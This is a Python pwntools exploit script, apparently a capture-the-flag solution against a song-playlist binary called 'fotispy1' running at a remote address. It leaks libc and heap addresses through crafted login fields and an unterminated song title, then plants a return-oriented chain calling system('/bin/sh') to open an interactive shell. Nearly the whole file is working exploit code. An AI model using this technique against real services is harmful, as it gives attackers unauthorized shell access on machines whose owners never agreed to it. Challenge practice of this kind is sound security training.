#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5191
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy1_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000401731
            b* 0x00000000004018DA
            b* 0x000000000040191C
            b* 0x000000000040195F
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def register(username, password):
    p.sendlineafter(b'[E]: ', str(0))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def login(username, password):
    p.sendlineafter(b'[E]: ', str(1))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def add(song_title, author, album):
    p.sendlineafter(b'[E]: ', str(2))
    p.sendlineafter(b'title: ', song_title)
    p.sendlineafter(b'from: ', author)
    p.sendlineafter(b'on: ', album)

def display():
    p.sendlineafter(b'[E]: ', str(3))

# VARIABLE
rw_section = 0x404800

# PAYLOAD
register(b'\0'*8 + p64(rw_section), b'abcdxyz'.ljust(0x20, b'\0') + p64(rw_section))
login(b'\0'*8 + p64(rw_section), b'abcdxyz'.ljust(0x20, b'\0') + p64(rw_section))

p.sendlineafter(b'[E]: ', str(2))
p.recvuntil(b'[DEBUG] ')
libc_leak = int(p.recvuntil(b'\n'), 16)
libc.address = libc_leak - libc.sym.printf
log.info("Libc base: " + hex(libc.address))
p.sendlineafter(b'title: ', b'a'*0xd)
p.sendlineafter(b'from: ', b'author')
p.sendlineafter(b'on: ', b'album')

display()
p.recvuntil(b'a'*0xd)
heap_leak = u32(p.recv(4))
heap_base = heap_leak - 0x730
log.info("Heap base: " + hex(heap_base))

pop_rdi = 0x00000000000277e5 + libc.address
ret = pop_rdi + 1
payload = p64(heap_base + 0x3d0) + b'a'*0x5
payload += p64(heap_base + 0x320)
payload += flat(
    b'\0'*8,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
add(payload, b'author', b'album')
display()

p.interactive()